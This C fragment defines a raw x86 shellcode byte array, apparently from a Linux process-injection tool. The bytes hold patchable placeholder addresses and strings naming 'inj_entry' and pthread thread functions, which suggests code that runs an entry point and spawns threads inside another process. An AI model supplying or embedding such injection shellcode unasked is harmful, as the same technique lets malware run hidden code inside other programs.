unsigned char shellcode[] = {0x8B, 0xEC, 0x8D, 0x64, 0x24, 0xFC, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5A, 0x8D, 0x52, 0xF5, 0x8D, 0x42, 0x43, 0xC7, 0x00, 0x41, 0x41, 0x41, 0x41, 0x8D, 0x42, 0x47, 0xC7, 0x00, 0x42, 0x42, 0x42, 0x42, 0x8D, 0x4D, 0xFC, 0x6A, 0x00, 0x8D, 0x42, 0x47, 0xFF, 0x30, 0x6A, 0x00, 0x51, 0x8D, 0x42, 0x43, 0xFF, 0x10, 0x83, 0xF8, 0x00, 0x74, 0xFB, 0xCC, 0x50, 0x6A, 0x01, 0x58, 0x50, 0xCD, 0x80, 0x83, 0xC4, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x8B, 0xEC, 0x8D, 0x64, 0x24, 0xF4, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x8D, 0x5B, 0xF5, 0x8D, 0x83, 0x11, 0x01, 0x00, 0x00, 0xC7, 0x00, 0x43, 0x43, 0x43, 0x43, 0x8D, 0x83, 0x15, 0x01, 0x00, 0x00, 0xC7, 0x00, 0x44, 0x44, 0x44, 0x44, 0x8D, 0x83, 0x19, 0x01, 0x00, 0x00, 0xC7, 0x00, 0x30, 0x30, 0x30, 0x30, 0x8D, 0x83, 0x1D, 0x01, 0x00, 0x00, 0x6A, 0x02, 0x8F, 0x00, 0x8D, 0x83, 0x33, 0x01, 0x00, 0x00, 0x50, 0x6A, 0xFE, 0x8D, 0x83, 0x15, 0x01, 0x00, 0x00, 0xFF, 0x10, 0x8B, 0xF0, 0x8D, 0x83, 0x51, 0x01, 0x00, 0x00, 0x50, 0x6A, 0xFE, 0x8D, 0x83, 0x15, 0x01, 0x00, 0x00, 0xFF, 0x10, 0x89, 0x45, 0xFC, 0x8D, 0x83, 0x42, 0x01, 0x00, 0x00, 0x50, 0x6A, 0xFE, 0x8D, 0x83, 0x15, 0x01, 0x00, 0x00, 0xFF, 0x10, 0x8B, 0xF8, 0x8D, 0x4D, 0xF4, 0x6A, 0x00, 0x8D, 0x83, 0xE8, 0x00, 0x00, 0x00, 0x50, 0x6A, 0x00, 0x51, 0xFF, 0xD6, 0x8D, 0x45, 0xF8, 0x50, 0xFF, 0x75, 0xF4, 0x8B, 0x45, 0xFC, 0xFF, 0xD0, 0x8D, 0x83, 0x29, 0x01, 0x00, 0x00, 0x50, 0xFF, 0x75, 0xF8, 0x8D, 0x83, 0x15, 0x01, 0x00, 0x00, 0xFF, 0x10, 0x8B, 0xC8, 0x8D, 0x83, 0x21, 0x01, 0x00, 0x00, 0xC7, 0x00, 0x42, 0x42, 0x42, 0x42, 0x8D, 0x83, 0x21, 0x01, 0x00, 0x00, 0xC7, 0x40, 0x04, 0x45, 0x45, 0x45, 0x45, 0x8D, 0x55, 0xF4, 0x8D, 0x83, 0x21, 0x01, 0x00, 0x00, 0x50, 0x51, 0x6A, 0x00, 0x52, 0xFF, 0xD6, 0x8B, 0xD8, 0xFF, 0x75, 0xF4, 0xFF, 0xD7, 0x83, 0xFB, 0x00, 0x74, 0xFB, 0xCC, 0x50, 0x6A, 0x01, 0x58, 0x50, 0xCD, 0x80, 0x83, 0xC4, 0x08, 0x55, 0x8B, 0xEC, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x59, 0x8D, 0x89, 0x10, 0xFF, 0xFF, 0xFF, 0x8D, 0x81, 0x1D, 0x01, 0x00, 0x00, 0xFF, 0x30, 0x8D, 0x81, 0x19, 0x01, 0x00, 0x00, 0xFF, 0x30, 0x8D, 0x81, 0x11, 0x01, 0x00, 0x00, 0xFF, 0x10, 0xC9, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x69, 0x6E, 0x6A, 0x5F, 0x65, 0x6E, 0x74, 0x72, 0x79, 0x00, 0x70, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5F, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x00, 0x70, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5F, 0x64, 0x65, 0x74, 0x61, 0x63, 0x68, 0x00, 0x70, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5F, 0x6A, 0x6F, 0x69, 0x6E, 0x00, 0xCC, 0xCC};
uint32_t sc1_length = 0x50;
#define CODE_SIZE 0x1000